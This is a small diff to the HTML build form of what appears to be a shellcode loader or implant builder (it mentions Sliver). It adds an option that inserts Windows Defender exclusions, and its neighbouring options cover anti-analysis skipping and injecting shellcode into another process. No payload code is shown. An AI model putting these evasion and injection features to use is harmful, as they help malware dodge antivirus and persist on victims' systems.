@@ -126,6 +126,7 @@
               <label class="check"><input type="checkbox" name="rwx" id="bld-rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
               <label class="check"><input type="checkbox" name="debug" id="bld-debug">   <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
               <label class="check hidden" id="field-inject-opt"><input type="checkbox" name="inject" id="bld-inject"> <span>ENABLE_INJECT — migrate shellcode to idle process on reboot, terminate host</span></label>
+              <label class="check hidden" id="field-wdexcl-opt"><input type="checkbox" name="wd_excl" id="bld-wdexcl"> <span>ENABLE_WD_EXCL — add Windows Defender path/process exclusions (UAC builds only)</span></label>
             </fieldset>
 
             <!-- Payload.h source -->
